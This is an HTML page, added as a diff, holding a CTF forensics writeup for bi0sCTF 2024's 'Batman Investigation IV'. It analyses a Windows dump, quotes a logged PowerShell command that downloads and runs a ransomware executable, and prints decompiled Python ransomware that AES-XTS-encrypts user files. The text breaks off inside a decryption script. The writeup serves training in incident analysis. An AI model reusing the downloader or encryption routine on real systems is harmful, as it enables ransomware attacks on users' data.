@@ -1,0 +1,1980 @@
+<!doctype html>
+<html class="scroll-smooth" lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      id="viewport"
+      content="width=device-width, initial-scale=1.0" />
+    <title>
+      Batman Investigation IV - The Last J0ke bi0sCTF 2024 Writeup | Azr43lkn1ght
+    </title><meta name="application-name" content="Azr43lkn1ght" />
+<meta name="apple-mobile-web-app-title" content="Azr43lkn1ght" />
+
+
+  <meta name="title" content="Batman Investigation IV - The Last J0ke bi0sCTF 2024 Writeup" />
+
+
+
+  <meta name="description" content="Full solution of Batman Investigation IV - The Last J0ke" />
+<meta name="theme-color" content="#ffffff" /><link rel="icon" href="/hellbat.png" /><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" /><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#ffffff" />
+
+
+
+
+  
+  <link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/instantsearch.css@8.0.0/themes/reset-min.css"
+    integrity="sha256-2AeJLzExpZvqLUxMfcs+4DWcMwNfpnjUeAAvEtPr0wU="
+    crossorigin="anonymous" />
+
+  
+  
+  
+  <link href="/css/search.css" rel="stylesheet" />
+
+
+
+
+
+
+
+
+
+
+
+<link href="/css/styles.css" rel="stylesheet" />
+
+<link href="/css/custom.css" rel="stylesheet" />
+  
+  
+  
+  <link href="/css/image-preview.css" rel="stylesheet" />
+
+  
+    
+    
+    
+    <link href="/css/syntax.css" rel="stylesheet" />
+  
+<script src="/js/third-party/flowbite/v2.2.1/flowbite.min.js" defer></script>
+<script>
+  
+  if (
+    localStorage.getItem("color-theme") === "dark" ||
+    (!("color-theme" in localStorage) &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches)
+  ) {
+    document.documentElement.classList.add("dark");
+  } else {
+    document.documentElement.classList.remove("dark");
+  }
+</script>
+
+  </head>
+  <body class="flex h-screen flex-col bg-white dark:bg-[#1b1f26]"><nav
+  id="navbar"
+  class="fixed start-0 top-0 z-20 flex w-full justify-center border-b border-gray-200 bg-white/85 backdrop-blur-md md:h-38 dark:border-gray-700 dark:bg-[#1b1f26]">
+  <div
+    class="mx-auto flex w-[1280px] flex-wrap items-center justify-between place-self-center object-center p-4">
+    
+    
+    <a
+      href="http://localhost:1313/"
+      class="flex items-center justify-start space-x-3 rtl:space-x-reverse">
+      
+      <p class="dark:text-primary rounded-full flex gap-3 items-center" style="font-size: 1.3rem">
+        <img src="https://raw.githubusercontent.com/Azr43lKn1ght/Azr43lKn1ght/main/h3LL.png" alt="logo" class="h-[50px] rounded-full" />
+        <b class="font-mono text-white hover:text-primary">Azr43lKn1ght</b>
+      </p></a>
+<div class="flex flex-col md:flex-row gap-6">
+    
+    <div class="flex items-center space-x-3 md:order-2 rtl:space-x-reverse">
+      
+      
+        <button
+          type="button"
+          id="search-icon"
+          class="bg-primary p-3 text-center text-sm font-medium text-white hover:bg-[#069096] focus:outline-none md:p-5 dark:bg-primary dark:hover:bg-[#069096]">
+          <svg
+            t="1702210633165"
+            class="icon"
+            viewBox="0 0 1024 1024"
+            version="1.1"
+            xmlns="http://www.w3.org/2000/svg"
+            p-id="4364"
+            width="16"
+            height="16">
+            <path
+              d="M426.666667 768a339.285333 339.285333 0 0 0 208.938666-72.021333l187.562667 187.562666 60.330667-60.330666-187.562667-187.562667A339.285333 339.285333 0 0 0 768 426.666667c0-188.202667-153.130667-341.333333-341.333333-341.333334s-341.333333 153.130667-341.333334 341.333334 153.130667 341.333333 341.333334 341.333333z m0-597.333333c141.184 0 256 114.816 256 256s-114.816 256-256 256-256-114.816-256-256 114.816-256 256-256z"
+              fill="#ffffff"
+              p-id="4365"></path>
+          </svg>
+        </button>
+      
+
+      
+      <button
+        data-collapse-toggle="navbar-sticky"
+        type="button"
+        class="inline-flex h-10 w-10 items-center justify-center p-2 text-sm text-gray-500 hover:bg-gray-100 focus:outline-none md:hidden dark:text-gray-400 dark:hover:bg-gray-700"
+        aria-controls="navbar-sticky"
+        aria-expanded="false">
+        <span class="sr-only">Open main menu</span>
+        <svg
+          class="h-5 w-5"
+          aria-hidden="true"
+          xmlns="http://www.w3.org/2000/svg"
+          fill="none"
+          viewBox="0 0 17 14">
+          <path
+            stroke="currentColor"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M1 1h15M1 7h15M1 13h15" />
+        </svg>
+      </button>
+    </div>
+    <span class="flex items-center absolute md:relative top-[50px] md:top-0 right-0 left-0">
+      <div
+  class="hidden w-full items-center justify-between md:order-1 md:flex md:w-auto"
+  id="navbar-sticky">
+  <ul
+    class="mt-4 flex flex-col rounded-lg border border-gray-300 p-4 font-medium md:mt-0 md:flex-row md:space-x-8 md:border-0 md:p-0 rtl:space-x-reverse dark:border-gray-700 dark:bg-gray-900 md:dark:bg-transparent">
+    
+      <li>
+        
+          <a
+            aria-current="page"
+            class="block rounded-lg px-3 py-2 text-gray-900 hover:bg-gray-100 md:p-0 md:hover:bg-transparent md:hover:text-[#00adb5] dark:border-gray-700 dark:text-white dark:hover:bg-gray-700 dark:hover:text-white md:dark:hover:bg-transparent md:dark:hover:text-[#00adb5]"
+            href="/">
+            
+            Home
+          </a>
+        
+      </li>
+    
+      <li>
+        
+          <a
+            aria-current="page"
+            class="block rounded-lg px-3 py-2 text-gray-900 hover:bg-gray-100 md:p-0 md:hover:bg-transparent md:hover:text-[#00adb5] dark:border-gray-700 dark:text-white dark:hover:bg-gray-700 dark:hover:text-white md:dark:hover:bg-transparent md:dark:hover:text-[#00adb5]"
+            href="/posts/">
+            
+            Posts
+          </a>
+        
+      </li>
+    
+
+    
+      <button
+        id="dropdownNavbarLink-category"
+        data-dropdown-toggle="dropdownNavbar-category"
+        class="flex w-full items-center justify-between rounded-lg px-3 py-2 text-gray-900 hover:bg-gray-100 md:w-auto md:border-0 md:p-0 md:hover:bg-transparent md:hover:text-[#00adb5] dark:border-gray-700 dark:text-white dark:hover:bg-gray-700 dark:focus:text-white md:dark:hover:bg-transparent md:dark:hover:text-[#00adb5]">
+        Category
+        <svg
+          class="ms-2.5 h-2.5 w-2.5"
+          aria-hidden="true"
+          xmlns="http://www.w3.org/2000/svg"
+          fill="none"
+          viewBox="0 0 10 6">
+          <path
+            stroke="currentColor"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="m1 1 4 4 4-4" />
+        </svg>
+      </button>
+
+      <div
+        id="dropdownNavbar-category"
+        class="z-10 hidden w-44 divide-y divide-gray-100 rounded-lg bg-white font-normal shadow dark:divide-gray-600 dark:bg-gray-800">
+        <ul
+          class="py-2 text-sm text-gray-700 dark:text-gray-400"
+          aria-labelledby="dropdownLargeButton">
+          
+            <li>
+              <a
+                href="http://localhost:1313/categories/bi0sctf/"
+                class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
+                >Bi0sCTF</a
+              >
+            </li>
+          
+            <li>
+              <a
+                href="http://localhost:1313/categories/ctf-writeups/"
+                class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
+                >CTF Writeups</a
+              >
+            </li>
+          
+            <li>
+              <a
+                href="http://localhost:1313/categories/dfir/"
+                class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
+                >DFIR</a
+              >
+            </li>
+          
+            <li>
+              <a
+                href="http://localhost:1313/categories/malware-analysis/"
+                class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
+                >Malware Analysis</a
+              >
+            </li>
+          
+            <li>
+              <a
+                href="http://localhost:1313/categories/malware-development/"
+                class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
+                >Malware Development</a
+              >
+            </li>
+          
+            <li>
+              <a
+                href="http://localhost:1313/categories/ransomware/"
+                class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
+                >Ransomware</a
+              >
+            </li>
+          
+            <li>
+              <a
+                href="http://localhost:1313/categories/rootkit-analysis/"
+                class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
+                >Rootkit Analysis</a
+              >
+            </li>
+          
+        </ul>
+      </div>
+    
+  </ul>
+</div>
+</span>
+  </div>
+  </div>
+</nav>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    let navbarDom = document.getElementById("navbar");
+    let isNavScrolled = false;
+
+    if (window.innerWidth >= 768) {
+      navbarDom.classList.add("navbar-init");
+
+      var scrollTop = 0;
+
+      window.addEventListener("scroll", function () {
+        scrollTop = window.pageYOffset;
+
+        if (scrollTop >= 10 && !isNavScrolled) {
+          isNavScrolled = true;
+          navbarDom.classList.add("navbar-scroll");
+        } else if (scrollTop < 10 && isNavScrolled) {
+          isNavScrolled = false;
+          navbarDom.classList.remove("navbar-scroll");
+        }
+      });
+    } else {
+      navbarDom.classList.remove("navbar-init");
+    }
+  });
+</script>
+
+  
+
+  
+  
+    
+    
+      <div id="post-feature" class="mt-22 w-full md:mt-[151px]">
+        <img
+          class="h-60 w-full object-cover md:h-120"
+          src="http://localhost:1313/images/posts/8.jpg"
+          alt="preview image"
+          srcset="" />
+      </div>
+    
+  
+
+
+  <div
+    id="single-page-container"
+    class="mx-auto my-5 w-full rounded-b-lg px-5 md:max-w-6xl">
+    <div class="flex w-full justify-between">
+      
+      <div id="post-container" class="w-full flex-grow">
+        
+        <div
+          id="post-title"
+          data-popover-target="popover-animation"
+          data-popover-offset="0"
+          data-popover-placement="bottom"
+          class="flex flex-col py-5 pl-0 pr-1 md:py-8 md:pl-1 md:pr-3 lg:py-10 lg:pl-7 lg:pr-10">
+          <div
+            class="flex flex-row flex-wrap space-x-1 border-l-8 border-primary pb-2 pl-2 pt-1 font-Oswald text-sm font-normal tracking-wide text-gray-500/90 dark:text-gray-300">
+            <span>Posted by April 10 2024</span>
+
+            
+            
+            
+              <span class="flex flex-row space-x-1">
+                
+                  <span class="text-primary"> / </span>
+                  <a
+                    class="border-b-2 border-transparent hover:border-b-2 hover:border-primary hover:text-[#00adb5]"
+                    href="http://localhost:1313/categories/malware-analysis/"
+                    >Malware Analysis</a
+                  >
+                
+                  <span class="text-primary"> / </span>
+                  <a
+                    class="border-b-2 border-transparent hover:border-b-2 hover:border-primary hover:text-[#00adb5]"
+                    href="http://localhost:1313/categories/dfir/"
+                    >DFIR</a
+                  >
+                
+                  <span class="text-primary"> / </span>
+                  <a
+                    class="border-b-2 border-transparent hover:border-b-2 hover:border-primary hover:text-[#00adb5]"
+                    href="http://localhost:1313/categories/bi0sctf/"
+                    >Bi0sCTF</a
+                  >
+                
+                  <span class="text-primary"> / </span>
+                  <a
+                    class="border-b-2 border-transparent hover:border-b-2 hover:border-primary hover:text-[#00adb5]"
+                    href="http://localhost:1313/categories/ctf-writeups/"
+                    >CTF Writeups</a
+                  >
+                
+                  <span class="text-primary"> / </span>
+                  <a
+                    class="border-b-2 border-transparent hover:border-b-2 hover:border-primary hover:text-[#00adb5]"
+                    href="http://localhost:1313/categories/rootkit-analysis/"
+                    >Rootkit Analysis</a
+                  >
+                
+              </span>
+            
+
+          </div>
+          <div
+            class="border-l-8 border-primary py-1 pl-2 text-start text-3xl font-bold tracking-wide text-black lg:text-4xl dark:text-white">
+            Batman Investigation IV - The Last J0ke bi0sCTF 2024 Writeup
+          </div>
+
+          <div
+            class="flex flex-row flex-wrap items-center space-x-1 border-l-8 border-primary pb-1 pl-2 pt-3.5 font-Oswald text-xs font-extralight tracking-wide text-gray-500/90 dark:text-gray-300">
+            <span>Updated on April 10 2024</span>
+            <div
+              class="h-1 w-1 rounded-full bg-primary"></div>
+            <span>2765 words</span>
+            <div
+              class="h-1 w-1 rounded-full bg-primary"></div>
+            <span>13 minutes read</span>
+            
+              <div
+                class="h-1 w-1 rounded-full bg-primary"></div>
+              <p>
+                <span
+                  id="twikoo_visitors"
+                  class="page-info-pageview-count"
+                  data-path="/Batman%20Investigation%20IV%20-%20The%20Last%20J0ke/"
+                  >...</span
+                >
+                visits
+              </p>
+            
+          </div>
+        </div>
+
+        
+        <div
+          id="single-content"
+          class="format mx-auto max-w-none px-1 py-5 md:format-base dark:format-invert format-figure:flex format-figure:flex-col format-figure:items-center format-img:cursor-zoom-in md:px-3 lg:px-10 dark:text-gray-300">
+          <p><strong>Challenge Points</strong>: 1000
+<strong>No. of solves</strong>: 0
+<strong>Challenge Authors</strong>: 
+<a
+  href="https://twitter.com/Azr43lKn1ght"
+  
+    target="_blank"
+  
+  >Azr43lKn1ght</a
+>
+, 
+<a
+  href="https://twitter.com/j0hith"
+  
+    target="_blank"
+  
+  >Jl_24</a
+>
+,
+<a
+  href="https://twitter.com/sp3p3x"
+  
+    target="_blank"
+  
+  >sp3p3x</a
+>
+, 
+<a
+  href="https://twitter.com/mspr75"
+  
+    target="_blank"
+  
+  >gh0stkn1ght</a
+>
+</p>
+<h2 class="group head-tag" id="challenge-description">Challenge Description:<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#challenge-description"></a></h2><p>Bruce Wayne was alerted that Joker have escaped from Arkham Asylum, Joker with all the Gotham outlaws crafts a letter for Bruce, He wants to make it go all crazy x_0!,and now Batman gets a message sent to Him with a letter, but apparently as Damain was in the Desktop, he opens it and everything goes crazy, the letter is now distributed to everyone in gotham, if Batman doesn&rsquo;t find a fix, There is no stopping the chaos. Can you help Batman fix the Pademonium?</p>
+<p><code>File Password : L1&gt;l:p7!7h4[D23^iZ&amp;)</code></p>
+<h2 class="group head-tag" id="handout">Handout<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#handout"></a></h2><ul>
+<li>
+<a
+  href="https://www.dropbox.com/scl/fi/rrru18br1a1c8nk4hownm/challf1le.zip?rlkey=x3kxgmhlmkhrfrrojiop43qd8&amp;dl=0"
+  
+    target="_blank"
+  
+  >Primary Link</a
+>
+</li>
+<li>
+<a
+  href="https://amritauniv-my.sharepoint.com/:u:/g/personal/inctfj_am_amrita_edu/EZdCwdTgK79No909OKYpHfEB1G_bTJYV007oWg8_FbdK3A?e=cO6E9R"
+  
+    target="_blank"
+  
+  >Mirror Link</a
+>
+</li>
+<li>nc link</li>
+</ul>
+<p><code>Flag format: bi0sctf{...}</code></p>
+<h2 class="group head-tag" id="solution">Solution:<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#solution"></a></h2>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image-13.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>We are given an <code>.ad1</code> file which is a dump taken from a windows machine. We can use <code>FTK Imager</code> to open the dump file and start our analysis.</p>
+<p>Answering the questions&hellip;</p>
+<h3 class="group head-tag" id="question-1">Question 1<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-1"></a></h3><p>Q1) What is the day and time that the infection was started ?</p>
+<p>Format : &ldquo;yyyy:mm:dd_hh:mm&rdquo;</p>
+<p>Going through the files present in the system we can see that it was all modified at the time of infection answering our first question.</p>
+<pre tabindex="0"><code>Answer Q1: 2024:02:24_00:37
+</code></pre><h3 class="group head-tag" id="question-2">Question 2<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-2"></a></h3><p>Q2) There are encrypted files, what is the algorithm used to encrypt them and what files store the decryption vectors?</p>
+<p>Format : algorithm-used_filename</p>
+<p>On parsing the evnt logs we can see that there was executable downloaded from <code>https://filebin.net/lfc6u585h3jmqfpp/ware</code>  saved as TwCSXWiv.exe and executed.</p>
+<pre tabindex="0"><code>105	105	2024-02-24 00:37:41	403	Info	PowerShell	Windows PowerShell	0	BruceWayne		Engine state is changed from Available to Stopped			HostApplication=PowerShell -Command iwr &#39;https://filebin.net/lfc6u585h3jmqfpp/ware&#39; -OutFile TwCSXWiv.exe
+</code></pre><p>It should be the ransomware as its execution time and the time the all the files got encrypted was around the same time. We can search for the exe and extract it.</p>
+<p>Upon doing <code>strings</code> on <code>TwCSXWiv.exe</code>, we can see that it is a <strong>python3.10</strong> binary.</p>
+<pre tabindex="0"><code>&gt;&gt;&gt; strings TwCSXWiv.exe | grep -i python
+Py_SetPythonHome
+Failed to get address for Py_SetPythonHome
+Error loading Python DLL &#39;%s&#39;.
+PYTHONUTF8
+Invalid value for PYTHONUTF8=%s; disabling utf-8 mode!
+Error detected starting Python VM.
+bpython3.dll
+bpython310.dll
+6python310.dll
+</code></pre><p>Inorder to reverse the binary, we can use 
+<a
+  href="https://github.com/extremecoders-re/pyinstxtractor.git"
+  
+    target="_blank"
+  
+  >pyinstxtractor</a
+>
+ to the get the bytecode/.pyc and then try to convert it to source code/.py using 
+<a
+  href="https://github.com/zrax/pycdc"
+  
+    target="_blank"
+  
+  >pycdc</a
+>
+.</p>
+<p>Using pyinstxtractor, we can get <code>TwCSXWiv.pyc</code> and then using pycdc on the .pyc file, we get,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># Source Generated with Decompyle++</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># File: ware.pyc (Python 3.10)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">winreg</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers</span> <span class="kn">import</span> <span class="n">Cipher</span><span class="p">,</span> <span class="n">algorithms</span><span class="p">,</span> <span class="n">modes</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">padding</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">configparser</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">filepath</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"><span class="n">Unsupported</span> <span class="n">opcode</span><span class="p">:</span> <span class="n">WITH_EXCEPT_START</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="kc">None</span><span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># WARNING: Decompyle incomplete</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">traverse_folder</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl"><span class="n">Unsupported</span> <span class="n">opcode</span><span class="p">:</span> <span class="n">JUMP_IF_NOT_EXC_MATCH</span>
+</span></span><span class="line"><span class="cl">    <span class="n">curpath</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">root</span> <span class="o">=</span> <span class="s1">&#39;C:</span><span class="se">\\</span><span class="s1">Users&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">excluded</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;C:</span><span class="se">\\</span><span class="s1">Users</span><span class="se">\\</span><span class="s1">Public&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;C:</span><span class="se">\\</span><span class="s1">Users</span><span class="se">\\</span><span class="s1">All Users&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;C:</span><span class="se">\\</span><span class="s1">Users</span><span class="se">\\</span><span class="s1">Default User&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># WARNING: Decompyle incomplete</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">config_file</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl"><span class="n">Unsupported</span> <span class="n">opcode</span><span class="p">:</span> <span class="n">WITH_EXCEPT_START</span>
+</span></span><span class="line"><span class="cl">    <span class="n">downloads_folder</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;USERPROFILE&#39;</span><span class="p">],</span> <span class="s1">&#39;Downloads&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;your_key_value&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="s1">&#39;your_iv_value&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">config</span> <span class="o">=</span> <span class="n">configparser</span><span class="o">.</span><span class="n">ConfigParser</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">config</span><span class="p">[</span><span class="s1">&#39;ransomkey&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="n">key</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">config</span><span class="p">[</span><span class="s1">&#39;ransomiv&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;iv&#39;</span><span class="p">:</span> <span class="n">iv</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">config_file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">downloads_folder</span><span class="p">,</span> <span class="s1">&#39;config.ini&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># WARNING: Decompyle incomplete</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">traverse_folder</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">config_file</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
+</span></span></code></pre></div><p>But as we can see by the <code># WARNING: Decompyle incomplete</code>, pycdc was not able to get back a major part of the code.
+We could manually reverse the bytecode for the incomplete parts, or we could use other tools like 
+<a
+  href="https://pylingual.io"
+  
+    target="_blank"
+  
+  >pylingual</a
+>
+ to do it for us.</p>
+<p>Analyzing the code, we can see the encrypt function:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">filepath</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">padder</span> <span class="o">=</span> <span class="n">padding</span><span class="o">.</span><span class="n">PKCS7</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="o">.</span><span class="n">padder</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">backend</span> <span class="o">=</span> <span class="n">default_backend</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mode</span> <span class="o">=</span> <span class="n">modes</span><span class="o">.</span><span class="n">XTS</span><span class="p">(</span><span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher1</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">(</span><span class="n">algorithms</span><span class="o">.</span><span class="n">AES</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">mode</span><span class="p">,</span> <span class="n">backend</span><span class="o">=</span><span class="n">backend</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encryptor1</span> <span class="o">=</span> <span class="n">cipher1</span><span class="o">.</span><span class="n">encryptor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">padder</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span> <span class="o">+=</span> <span class="n">padder</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ct1</span> <span class="o">=</span> <span class="n">encryptor1</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span> <span class="o">+</span> <span class="n">encryptor1</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">updatedfilepath</span> <span class="o">=</span> <span class="n">filepath</span> <span class="o">+</span> <span class="s1">&#39;.wared&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">ct1</span> <span class="o">+</span> <span class="n">iv</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">updatedfilepath</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
+</span></span></code></pre></div><p>making a decrypting script</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"> <span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">padding</span>
+</span></span><span class="line"><span class="cl"> <span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers</span> <span class="kn">import</span> <span class="n">Cipher</span><span class="p">,</span> <span class="n">algorithms</span><span class="p">,</span> <span class="n">modes</span>
+</span></span><span class="line"><span class="cl"> <span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">     <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">         <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">             <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">         <span class="n">backend</span> <span class="o">=</span> <span class="n">default_backend</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">         <span class="n">mode</span> <span class="o">=</span> <span class="n">modes</span><span class="o">.</span><span class="n">XTS</span><span class="p">(</span><span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">         <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">(</span><span class="n">algorithms</span><span class="o">.</span><span class="n">AES</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">mode</span><span class="p">,</span> <span class="n">backend</span><span class="o">=</span><span class="n">backend</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">         <span class="n">decryptor</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decryptor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
